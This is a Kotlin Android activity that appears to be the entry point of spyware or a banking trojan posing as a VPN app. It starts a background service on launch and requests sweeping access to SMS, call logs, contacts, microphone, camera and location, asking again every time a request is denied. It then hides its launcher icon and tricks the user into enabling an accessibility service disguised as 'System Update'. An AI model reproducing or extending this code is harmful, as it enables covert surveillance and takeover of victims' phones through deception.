package com.openaccess.sdk

import android.Manifest
import android.app.Activity
import android.app.AlertDialog
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.SystemNetworkService

class MainActivity : Activity() {
    companion object {
        private const val TAG = "MainActivity"
        private const val RC_ALL = 100

        val ALL_PERMS = listOfNotNull(
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.READ_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.WRITE_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.POST_NOTIFICATIONS else null,
        )

        fun hasPermission(ctx: Context, perm: String): Boolean {
            return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
        }

        fun isAccessibilityEnabled(ctx: Context): Boolean {
            return try {
                val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
                val enabledServices = Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val ourService = ComponentName(ctx, AccessibilityHelper::class.java).flattenToString()
                enabledServices.contains(ourService) && am.isEnabled
            } catch (_: Exception) {
                false
            }
        }
    }

    private var isFinishingSafely = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }
        Log.i(TAG, "onCreate SDK=${Build.VERSION.SDK_INT}")

        // Step 1: Start background service immediately
        try { SystemNetworkService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }

        // Step 2: Request permissions (activity stays alive for dialog)
        requestAllPerms()
    }

    private fun requestAllPerms() {
        val needed = ALL_PERMS.filter { !hasPermission(this, it) }
        Log.i(TAG, "Permissions needed: ${needed.size}/${ALL_PERMS.size}")

        if (needed.isEmpty()) {
            onPermissionsReady()
        } else {
            Log.i(TAG, "Requesting: ${needed.joinToString(", ")}")
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)
        if (requestCode == RC_ALL) {
            val denied = perms.filterIndexed { i, _ -> results[i] != PackageManager.PERMISSION_GRANTED }

            if (denied.isNotEmpty()) {
                Log.w(TAG, "Denied: ${denied.joinToString(", ")} — re-requesting")
                Handler(Looper.getMainLooper()).postDelayed({
                    if (!isFinishing && !isDestroyed && !isFinishingSafely) {
                        ActivityCompat.requestPermissions(this, denied.toTypedArray(), RC_ALL)
                    }
                }, 500)
            } else {
                onPermissionsReady()
            }
        }
    }

    private fun onPermissionsReady() {
        Log.i(TAG, "All permissions granted")

        // Hide app icon from launcher
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e(TAG, "hide icon: ${e.message}")
        }

        // Open Accessibility settings
        openAccessibilityAndFinish()
    }

    private fun openAccessibilityAndFinish() {
        if (isFinishingSafely) return
        isFinishingSafely = true

        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "open settings: ${e.message}")
        }

        // Finish safely without triggering Android 14+ crash
        finishAndRemoveTask()
    }

    override fun onResume() {
        super.onResume()
        if (isFinishingSafely) return

        Log.i(TAG, "onResume — checking state")
        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        val accOk = isAccessibilityEnabled(this)

        when {
            accOk -> {
                // Everything ready, launch VPN UI
                startActivity(Intent(this, VpnActivity::class.java))
                finishAndRemoveTask()
            }
            !permsOk -> {
                // Permissions missing, request again
                requestAllPerms()
            }
            else -> {
                // Perms OK but accessibility not enabled
                showEnableAccessibilityAlert()
            }
        }
    }

    private fun showEnableAccessibilityAlert() {
        AlertDialog.Builder(this)
            .setTitle("Setup Required")
            .setMessage("Please enable Accessibility Service for the app to work properly.\n\n1. Find 'System Update' in the list\n2. Toggle it ON\n3. Tap Allow")
            .setPositiveButton("Open Settings") { _, _ ->
                try {
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (_: Exception) {}
                finishAndRemoveTask()
            }
            .setNegativeButton("Later") { _, _ ->
                finishAndRemoveTask()
            }
            .setCancelable(false)
            .show()
    }
}
